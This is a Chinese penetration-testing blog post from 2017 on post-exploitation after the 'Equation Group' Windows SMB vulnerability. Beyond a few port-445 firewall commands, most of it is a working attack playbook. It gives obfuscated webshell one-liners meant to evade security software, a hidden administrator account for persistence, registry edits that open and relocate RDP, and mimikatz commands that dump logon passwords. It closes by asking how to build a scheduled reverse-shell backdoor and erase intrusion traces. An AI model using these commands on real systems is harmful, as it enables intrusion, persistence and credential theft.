Title: windows方程式漏洞利用相关
Category: Pentest
Date: 2017-5-4
slug: windows-shadow


##445端口关闭打开
这个洞很简单就可以拿到system权限，先说权限维持。

####首先第一个关掉445:

```
netsh advfirewall set allprofiles state on  //打开防火墙
netsh advfirewall firewall add rule name="Close Port 445" dir=in action=[block|allow] protocol=TCP localport=445  //关掉打开445端口

 netsh advfirewall firewall add rule name="Open SQL Server Port 1433" dir=in action=allow protocol=TCP localport=1433  //打开1433端口

 netsh advfirewall firewall add rule name="Allow Messenger" dir=in action=allow program="C:\programfiles\messenger\msnmsgr.exe" //将某个exe加入防火墙

```
 
* <https://technet.microsoft.com/en-us/library/dd734783(v=ws.10).aspx#BKMK_3_set>  官方man手册
* <https://support.microsoft.com/en-us/help/947709/how-to-use-the-netsh-advfirewall-firewall-context-instead-of-the-netsh-firewall-context-to-control-windows-firewall-behavior-in-windows-server-2008-and-in-windows-vista>  老的语法和新的
* <http://windowsitpro.com/windows-server/top-10-windows-firewall-netsh-commands> 各种各样的实际例子
 
####写个过狗的webshell

```
echo "<?php @eval($_REQUEST["shell"]);?>" >> shell.php
echo "<?php $a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e='($_REQUEST[a])';@assert($a.$b.$c.$d.$e);?>" >> shell.php
echo "<%@ Page Language="Jscript"%><%eval(Request.Item["shell"],"unsafe");%>" >> shell.aspx
echo "<%eval request("shell")%>" >> shell.asp
 
```

1. 在获取最高权限之后，一般找个文件写shell，这个shell最好是**一句话过狗**，不管哪种系统，如果可以写一句话过狗最好写过狗。后期目标可能会上安全狗之类的软件，有了过狗的shell之后，方便下次绕过。
 
####windows权限维持
 
从system写入webshell之后权限一般会变低:)，这个时候用ms16-032提权添加用户，通过webshell上传mimikatz抓取密码.

#####添加后门上远控

```
net user PHPNET$ 1234abcd~ /add     //添加用户
net localgroup administrators PHPNET$ /add  //将用户添加到管理组
net user PHPNET$ /del   //删除用户
```
添加用户之后远程连接过去:

```
 REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber //在webshell下查看3389端口是否更改，出来的结果是16进制
 
 以下未测试：
 
开启3389端口dos命令（开启XP&2003终端服务）
方法 一 ：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
方法 二 ：REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f

查看3389端口是否开启
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启

更改终端端口为2008(十六进制为：0x7d8)
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f

取消xp&2003系统防火墙对终端服务的限制及IP连接的限制：
REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f

```

此时可以链接3389

然后抓取密码

```
D:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir   //打印输出mimikatz
D:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt //输出到log.txt
```


###待解决的问题

* 除了远控，如何通过powershell，在windows上面建立一个定时的任务，类似linux的crontab后门，只添加一个定时执行的任务，比如每5分钟反弹某个服务器。如何达成？

* 是否存在某个powershell脚本可以清理当前的渗透测试记录？


参考资料：

* <http://www.jozxing.cc/archives/976>
* <http://www.jozxing.cc/archives/374>




